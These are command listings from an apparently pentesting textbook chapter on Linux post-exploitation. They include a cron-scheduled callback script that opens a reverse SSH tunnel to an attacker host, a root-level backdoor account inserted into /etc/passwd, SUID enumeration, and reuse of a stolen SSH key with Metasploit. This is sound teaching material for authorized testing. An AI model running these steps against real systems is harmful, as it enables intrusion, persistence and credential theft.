# Chapter 9 Instructions

### Listing 9.1 Creating a new SSH key pair

```
ssh-keygen -t rsa
```

### Listing 9.2 Using scp to transfer SSH public keys

```
ssh-copy-id piccolo@10.0.10.204
```

### Listing 9.3 Example sshd_config file enabling SSh public key authentication

```
sudo nano /etc/ssh/sshd_config
```

### Listing 9.4 Authenticating using an SSH key instead of a password

```
ssh piccolo@10.0.10.204
```

### Listing 9.5 Displaying listening ports with netstat

```
ssh -N -R 54321:localhost:22 kali@10.0.10.211
netstat -ant | grep -i listen
```

### Listing 9.6 Connecting to a tunneled SSH port

```
ssh pentest@localhost -p 54321
```

### Listing 9.7 Contents of the callback.sh script

```
#!/bin/bash
createTunnel(){
 /usr/bin/ssh -N -R 54321:localhost:22 kali@10.0.10.211
}
/bin/pidof ssh
if [[ $? -ne 0 ]]; then
 createTunnel
fi
```

```
crontab -e
1
*/5 * * * * /tmp/callback.sh
```

### Listing 9.8 Hidden .dot files and directories

```
ls -la
```

### Listing 9.9 Using cat + more to view .bash_history

```
cat .bash_history | more
```

### Listing 9.10 Normal execute permissions and SUID permissions

```
ls -lah /bin/ls
ls -lah /usr/bin/passwd
```

### Listing 9.11 Using find to search for SUID binaries

```
find / -perm -u=s 2>/dev/null
```

## 9.3.2 Inserting a new user into /etc/passwd

```
cp /etc/passwd passwd1
cp /etc/passwd passwd2
openssl passwd -1 -salt pentest P3nt3st!
```

### Listing 9.13 Modifying /etc/passwd to create a root user account

```
nano passwd1
pentest:$1$pentest$NPv8jf8/11WqNhXAriGwa.:0:0:root:/root:/bin/bash
```

### Listing 9.14 Backdooring the /etc/passwd file

```
cp passwd1 /etc/passwd
su pentest
id -a
```

### Listing 9.15 Contents of a user’s ~/.ssh directory

```
ls -l ~/.ssh
```

### Listing 9.16 Contents of an SSH private key

```
cat ~/.ssh/pentestkey
```

### Listing 9.17 Authenticating with the SSH Public Key Login Scanner module

```
msfconsole
use auxiliary/scanner/ssh/ssh_login_pubkey
set KEY_PATH /home/kali/stolen_sshkey
set rhosts 10.0.10.204
set username piccolo
set verbose false
run
```
